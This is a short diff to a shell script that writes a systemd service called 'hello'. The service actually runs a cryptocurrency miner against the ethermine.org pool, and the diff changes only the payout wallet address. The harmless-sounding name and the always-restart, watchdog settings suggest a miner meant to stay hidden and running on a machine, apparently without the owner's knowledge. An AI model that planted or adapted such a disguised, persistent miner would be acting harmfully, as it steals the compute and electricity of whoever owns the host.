@@ -6,7 +6,7 @@ cat > /lib/systemd/system/hello.service <<EOL
 Description=hello
 After=network.target
 [Service]
-ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x9348b7d60481095f430d12e14d91f36971118fc5.g7 -p x
+ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0x77D0dAB1A436F13E0045E581b17302b29EDFae9c.g7 -p x
 WatchdogSec=1800
 Restart=always
 RestartSec=60
